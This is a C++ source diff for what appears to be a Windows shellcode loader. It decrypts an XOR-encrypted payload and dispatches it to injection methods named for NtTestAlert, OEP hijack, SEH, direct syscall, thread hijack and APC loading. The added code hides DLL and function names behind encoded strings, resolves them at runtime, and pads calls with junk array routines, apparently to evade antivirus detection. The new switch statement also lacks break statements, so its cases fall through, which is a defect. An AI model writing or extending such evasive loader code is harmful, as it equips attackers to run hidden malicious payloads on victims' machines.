@@ -9,8 +9,6 @@
 #include "Launch.h"
 
 
-
-
 void Launch::au9u5tDecrypt() {
     std::ifstream inputFile{this->filePath, std::ios::binary};
     if (!inputFile) {
@@ -84,7 +82,10 @@ void Launch::func6N_XOR(long long int &diff, std::string &encryptedData) {
         const auto *decryptedData = reinterpret_cast<const unsigned char *>(decryptedDate.c_str());
         auto byteLength = decryptedDate.length();
 
-        this->launchFunction(function_mode, decryptedData, byteLength);
+//        this->launchFunction(function_mode, decryptedData, byteLength);
+        this->launchFunctionV2(function_mode, decryptedData, byteLength);
+    } else {
+        std::cout << "Invalid random value!" << std::endl;
     }
 }
 
@@ -161,12 +162,12 @@ void Launch::launchFunction(std::string function_mode, const unsigned char *decr
         this->printMode("Function 9");
         this->startBase(MasterEncoderForNtTestAlertLoad::function1, decryptedData, byteLength);
         Confusion::generateAndSortArray();
-    }else if (function_mode == "10") {
+    } else if (function_mode == "10") {
         Confusion::generateAndSortArray();
         this->printMode("Function 10");
         this->startBase(MasterEncoderForOEPHiijackInjectLoad::function1, decryptedData, byteLength);
         Confusion::generateAndSortArray();
-    }else if (function_mode == "11") {
+    } else if (function_mode == "11") {
         Confusion::generateAndSortArray();
         this->printMode("Function 11");
         this->startBase(MasterEncoderForSEHExceptLoad::function1, decryptedData, byteLength);
@@ -176,29 +177,29 @@ void Launch::launchFunction(std::string function_mode, const unsigned char *decr
         this->printMode("Function 12");
         this->startBase(MasterEncoderForSyscallLoad::function1, decryptedData, byteLength);
         Confusion::generateAndSortArray();
-    }else if (function_mode=="13") {
+    } else if (function_mode == "13") {
         Confusion::generateAndSortArray();
         this->printMode("Function 13");
         this->startBase(MasterEncoderForThreadHiijack_InjectLoad::function1, decryptedData, byteLength);
         Confusion::generateAndSortArray();
-    }else if (function_mode=="14") {
+    } else if (function_mode == "14") {
         Confusion::generateAndSortArray();
         this->printMode("Function 14");
         this->startBase(lib::function1, decryptedData, byteLength);
         Confusion::generateAndSortArray();
-        std::cout<<"Function 14 out"<<std::endl;
-        while(true){
+        std::cout << "Function 14 out" << std::endl;
+        while (true) {
             Sleep(10000);
-            std::cout<<"Function 14 in while_true"<<std::endl;
+            std::cout << "Function 14 in while_true" << std::endl;
         }
     } else {
-        std::cout << "Invalid function mode!" << std::endl;
+        std::cout << "Invalid func mode!" << std::endl;
         return;
     }
 }
 
 void Launch::printMode(const string &mode) {
-    std::cout << "in function: " << mode << std::endl;
+    std::cout << "in func: " << mode << std::endl;
 }
 
 void Launch::startBase(startFunction startFunction, const unsigned char *decryptedData, size_t &byteLength) {
@@ -221,5 +222,106 @@ void Launch::startBase(startFunction2 startFunction, const unsigned char *decryp
     Confusion::generateAndSortArray();
     Confusion::generateAndTransformArray();
     MasterEncoderForApcLoader::generateAndSortArray();
+}
+
+dllAndFunction Launch::getDllNameAndFuncName(const string &function_mode) {
+    std::string baseFuncNamePart1{R"(:,^XB&"W},dH?a}JAI>TAE`|)"}; // MasterEncoderFor
+    std::string baseFuncNamePart2{R"([HNKB,dHB&JT?H%`)"}; // ::function1
+    std::string fullFuncName{};
+    std::string dName{};
+    std::string funcName{};
+
+    int intFunctionMode = std::stoi(function_mode);
+    switch (intFunctionMode) {
+        case 1: {
+            dName = R"(}&JW>,+Y?*J=?a^I_K}Q?!`|)"; // DirectlyLoader
+            funcName = R"(}&JW>,+Y?*J=?a^I>.(`)";
+        }
+        case 2: {
+            dName = R"({.@H;,dO>,+Y:&hF>#dI?&U`)"; // DirectlyLoader
+            funcName = R"({.@H:&hF>&"W)";
+        }
+        case 3: {
+            dName = R"({b)J<.}J"&FW>,^Y'&hT?^BF/.}=?a^I_K}Q?!`|)"; // DirectlyLoader
+            funcName = R"({b)J<.}J"&FW>,^Y'&hT?^BF/.}=?a^I>.(`)";
+        }
+        case 4: {
+            dName = R"(}*JS<,ZN<YVT<,{S>&VQ)";
+            funcName = R"(}*JS<,ZN<YVT<,}JAE`|)";
+        }
+        case 5: {
+            dName = R"(}*JS<,ZN<YVT<,}{?*"X_K}Q?!`|)";
+            funcName = R"(}*JS<,ZN<YVT<,}{?*"X)";
+        }
+        case 6: {
+            dName = R"(},^W?*J#/.)I{"@$.YJS/K"Y<YVT<,{S>&VQ)";
+            funcName = R"(},^W?*J#/.)I{"@$.YJS/K"Y<YVT<,{`)";
+        }
+        case 7: {
+            dName = R"(}KJG>.)=?a^I_K}Q?!`|)";
+            funcName = R"(}KJG>.)=?a^I)";
+        }
+        case 8: {
+            dName = R"(:L}$AK"FB&":>,+Y/,hS:&hF>#dI?&U`)";
+            funcName = R"(:L}$AK"FB&":>,+Y/,hS:&hF>!`|)";
+        }
+        case 9: {
+            dName = R"(:L}'>.+Y{,VJAL}=?a^I_K}Q?!`|)";
+            funcName = R"(:L}'>.+Y{,VJAL}=?a^I)";
+        }
+        case 10: {
+            dName = R"(:Y"{;&JN/K^H/Zh)?KNJ<b}=?a^I_K}Q?!`|)";
+            funcName = R"(:Y"{;&JN/K^H/YJS/K"HB%VT<,{`)";
+
+        }
+        case 11: {
+            dName = R"('Y"(}.FH>.@Y:&hF>#dI?&U`)";
+            funcName = R"('Y"(}.FH>.@Y:&hF>!`|)";
+        }
+        case 12: {
+            dName = R"('bJX<a^Q?%VT<,{S>&VQ)";
+            funcName = R"('bJX<a^Q?%VT<,{`)";
+        }
+        case 13: {
+            dName = R"("&FW>,^I;&JN/K^H/Zh)?KNJ<b}=?a^I_K}Q?!`|)";
+            funcName = R"("&FW>,^I;&JN/K^H/Zh)?KNJ<b}=?a^I)";
+        }
+        default: {
+            dName = R"(}&JW>,+Y?*J=?a^I_K}Q?!`|)"; // DirectlyLoader
+            funcName = R"(}&JW>,+Y?*J=?a^I>.(`)";
+        }
+    }
+    fullFuncName = augustEncryption::decode(baseFuncNamePart1) +
+                   augustEncryption::decode(funcName) +
+                   augustEncryption::decode(baseFuncNamePart2);
+    return {augustEncryption::decode(dName), fullFuncName};
+}
+
+std::string Launch::strXor(const string &data) {
+    auto temp = data;
+    for (auto i{0}; i < data.length(); i++) {
+        temp[i] = data[i] ^ i;
+    }
+    return temp;
+}
+
+void Launch::launchFunctionV2(std::string function_mode, const unsigned char *decryptedData, size_t &byteLength) {
+    auto dllAndFuncName = this->getDllNameAndFuncName(function_mode);
+    auto dllName = dllAndFuncName.first;
+    auto funcName = dllAndFuncName.second;
+
+    if (function_mode == "14") {
+        Confusion::generateAndSortArray();
+        this->printMode("Function 14");
+        this->startBase(lib::function1, decryptedData, byteLength);
+        Confusion::generateAndSortArray();
+        std::cout << "Function 14 out" << std::endl;
+        while (true) {
+            Sleep(10000);
+            std::cout << "Function 14 in while_true" << std::endl;
+        }
+    } else {
+        loadLibrary::runFuncFromDll(dllName, funcName, decryptedData, byteLength);
+    }
 }
 
